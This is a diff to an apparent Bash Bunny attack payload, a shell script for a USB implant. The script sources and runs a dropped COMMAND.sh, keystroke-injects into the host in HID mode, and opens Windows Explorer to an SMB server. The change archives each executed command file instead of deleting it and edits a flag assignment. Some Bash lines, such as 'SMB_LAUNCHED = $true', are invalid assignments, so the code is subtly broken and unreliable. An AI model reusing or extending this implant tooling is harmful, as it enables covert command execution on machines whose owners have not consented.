@@ -8,6 +8,9 @@ GET SWITCH_POSITION
 # Just so we don't try and start the SMB server 50 times over..
 SMB_LAUNCHED = $false
 
+# So we can store our COMMAND.sh's
+CMD_NUMBER = 0
+
 # Switch directory
 readonly PAYLOAD_DIR="/root/udisk/payloads/$SWITCH_POSITION"
 # Log paths
@@ -27,6 +30,7 @@ then
 	exit 1
 fi
 mkdir -p "$PAYLOAD_DIR/ww/mfs"
+mkdir -p "$PAYLOAD_DIR/ww/cmds"
 
 # Mount the Bunny's udisk
 echo "+ Mounting file system.." >> $LOG_FILE
@@ -63,6 +67,18 @@ do
 		echo "+ Command received, running it.." >> $LOG_FILE
 		source "$PAYLOAD_DIR/ww/COMMAND.sh" >> $CMD_FILE
 		echo "+ Commands finished" >> $LOG_FILE
+		NAME=COMMAND
+		if [ -f "cmds/$NAME.sh" ]
+		then
+			i=0
+			while [[ -e "cmds/$NAME-$i.sh" ]] ; do
+				let i++
+			done
+			NAME=$NAME-$i
+		fi
+		mv -f "COMMAND.sh" "cmds/$NAME.sh"
+		echo "+ Moved COMMAND.sh to cmds/$NAME.sh" >> $LOG_FILE
+		echo "+ Waiting for commands.." >> $LOG_FILE
 		sleep 2
 		if [ $SMB_LAUNCHED = $false ]
 		then
@@ -70,7 +86,6 @@ do
 		else
 			LED C SLOW
 		fi
-		rm "COMMAND.sh"
 	fi
 	# Letter A was started
 	if [ -f "LAUNCHER_A" ]
@@ -131,7 +146,7 @@ do
 			if [ $SMB_LAUNCHED = $false ]
 			then
 				LED C
-				$SMB_LAUNCHED = $true
+				SMB_LAUNCHED = $true
 				echo "+ Launching file browser to SMB server.." >> $LOG_FILE
 				# Just wanna start powershell real quick..(sets up a loop to wait for the Bunny to get ready, then starts Windows Explorer - pointed at the SMB server)
 				ATTACKMODE HID
